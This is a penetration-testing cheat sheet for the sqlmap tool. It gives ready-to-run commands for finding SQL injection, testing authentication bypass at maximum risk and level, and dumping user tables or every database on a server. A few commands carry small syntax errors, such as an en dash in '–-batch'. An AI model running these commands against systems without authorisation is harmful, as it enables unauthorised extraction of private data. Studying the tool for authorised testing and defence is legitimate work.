# SQLMAP Essentials

---

## Introduction

SQLmap automates the process of SQL-injection discovery and exploitation. SQLmap is a mature and versatile tool with plenty of documentation. There are two levels of help pages in order to guide the user.

Basic listing:

```
sqlmap -h
```

Advanced listing:

```
sqlmap -hh
```

---

## Crafting HTTP Requests

When running SQLmap against GET parameters, the parameters are simply provided in the URL:

```
sqlmap -u "http://www.example.com/vuln.php?id=1" –-batch
```

The **--batch** flag skips required user-input by automatically choosing the default option. 

When running SQLmap against POST parameters, the parameters are provided in the data field with the '**--data**' flag:

```
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

If there are multiple parameters, but you only want to test specific ones, you can **mark them** with the * symbol:

```
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

Requests can get quite long and complicated. I highly recommend using SQLmaps ability to **parse** request data from file. Simply capture a request in BurpSuite, insert the * symbol after every parameter you want to test and save the request to file. 

Use the **-r** flag to parse from file:

```
sqlmap -r req.txt --batch
```

---

## Attack Tuning

Every SQLmap payload consists of two parts:

- Vector
- Boundary

A **vector** is the actual SQL code to be executed. A **boundary** consists of special characters that surround the vector, such as quotes, parenthesis and comments. 

SQLmap uses a default set of the most common vectors and boundaries. This set can be increased with the following flags:

| Flag              | Description                                      |
| ----------------- | ------------------------------------------------ |
| `--risk`          | `Increase set of vectors (1-3)`                  |
| `--level`         | `Increase set of vectors and boundaries (1-5)`   |

Both of the above flags have a default value of *1*, producing a set of **72** different payloads for each parameter. With the highest setting [3, 5], this set increases to **7865** payloads for each parameter. 

When testing for **authentication bypasses** the highest risk- and level settings should be used.

```
sqlmap -r req.txt --risk=3 --level=5 --batch -v
```

---

## Injection Techniques

SQLmap uses six different SQL-injection techniques, and a combination of all techniques is used by default. In certain situations it may be a good idea to tweak these settings.

The different techniques are abbreviated BEUSTQ:

- Booleans-based blind (B)
- Error-based (E)
- Union query-based (U)
- Stacked queries (S)
- Time-based blind (T)
- Inline queries (Q)

The technique settings are tweaked through the **--technique** flag:

```
sqlmap -r req.txt --technique=BEU --batch
```

---

## Database Enumeration

Once a SQL-injection vulnerability has been identified, database enumeration can begin. 

Common flags for basic database enumeration include:

| Flag              | Description                |
| ----------------- | -------------------------- |
| `--banner`        | `DB version`               |
| `--current-user`  | `DB user `                 |
| `--current-db`    | `DB name`                  |
| `--is-dba`        | `Check for DBA privileges` |

```
sqlmap -r req.txt --banner --current-user --current-db --is-dba --batch
```

When you have identified a DB name, you can start enumerating tables and their contents. 

Useful flags for table enumeration inlcude:

| Flag                      | Description                                       |
| ------------------------- | ------------------------------------------------- |
| `--tables`                | `Enumerate tables`                                |
| `-D`                      | `Name of DB `                                     |
| `-T`                      | `Name of table`                                   |
| `-C`                      | `Name of column`                                  |
| `--start`                 | `Specific row/s - start range`                    |
| `--stop`                  | `Specific row/s - end range`                      |
| `--dump`                  | `Dump content in table`                           |
| `--dump-all`              | `Dump all tables in DB`                           |
| `--exclude-sysdbs`        | `Skip default system DBs when dumping all tables` |

Enumerate all tables in DB called **testdb**:

```
sqlmap -r req.txt --tables -D testdb --batch
```

Dump data from entire **users** table in DB **testdb**:

```
sqlmap -r req.txt -D testdb -T users --dump --batch
```

Dump data from specific columns from **users** table in DB **testdb**:

```
sqlmap -r req.txt -D testdb -T users -C fname, lname --dump --batch
```

Dump data from specific rows from **users** table in DB **testdb**:

```
sqlmap -r req.txt -D testdb -T users --start=2 --stop=4 --dump --batch
```

Dump data from all tables in DB **testdb**:

```
sqlmap -r req.txt -D testdb --dump --batch
```

Dump data from all tables from all DBs in the entire DBMS:

```
sqlmap -r req.txt --dump-all --exclude-sysdbs --batch
```